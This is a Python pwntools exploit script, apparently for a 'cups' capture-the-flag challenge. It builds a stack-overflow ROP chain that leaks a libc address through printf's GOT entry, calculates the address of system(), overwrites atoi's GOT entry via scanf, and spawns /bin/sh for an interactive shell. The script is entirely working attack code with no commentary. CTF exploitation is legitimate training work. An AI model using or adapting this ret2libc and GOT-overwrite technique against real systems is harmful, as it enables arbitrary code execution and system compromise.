from pwn import *

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
s = remote('localhost',9999)
#s = remote('c0ffee.svattt.org',31334)

def off(n):
	result = ''
	for i in range(0,n/4):
		result += letters[i]*4
	return result

def pwn():
	pause()

	num_of_cups = 1
	print s.recvuntil('cups> ')
	s.sendline(str(1))

	for i in range(0,10):
		name = 'boe'
		size_of_name = len(name)
		print s.recvuntil('size> ')
		s.sendline(str(size_of_name))
		s.sendline(name)

		print s.recvuntil('>> ')
		s.sendline('AAAAAAAA')

		print s.recvuntil('> ')
		s.sendline('yes')

#	print s.recvuntil('size> ')
#	s.sendline(str(128))
#	s.sendline('A'*128)
#	print s.recvuntil('>> ')
#	s.sendline('AAAAAAAA')
#	print s.recvuntil('> ')
#	s.sendline('no')

#	s.interactive()

	printf_plt = 0x08048580
	printf_got = 0x0804B014

	scanf_plt = 0x08048690
	pop_ret = 0x8048549
	pop2_ret = 0x8048884
	fmt_str = 0x08048F41
	atoi_got = 0x0804B05C

	main = 0x08048920




	payload = 'A'*20
#	payload += p32(main)
	payload += p32(printf_plt) + p32(pop_ret) + p32(printf_got) 
	payload += p32(scanf_plt) + p32(pop2_ret) + p32(fmt_str) + p32(atoi_got)
	payload += p32(main)

	size = len(payload)
	print s.recvuntil('size> ')
	s.sendline(str(size))
	s.sendline(payload)

	print s.recvuntil('>> ')
	s.sendline('AAAAAAAA')

	print s.recvuntil('> ')
	s.sendline('no')


#	s.interactive()
	data = s.recvuntil('\xb7')
	print 'data:', data
	leak = u32(data[data.find('\xb7')-3:data.find('\xb7')+1])
	print 'leak:', hex(leak)

	system_l = leak - 0x00049670 + 0x0003ada0
	system_s = leak - 0x00049670 + 0x0003ada0
#	binsh_l = leak - 0x00049670 + 0x15b82b

	s.sendline(p32(system_s))
	s.recvuntil('cups> ')
	s.sendline('/bin/sh')
	s.interactive()


pwn()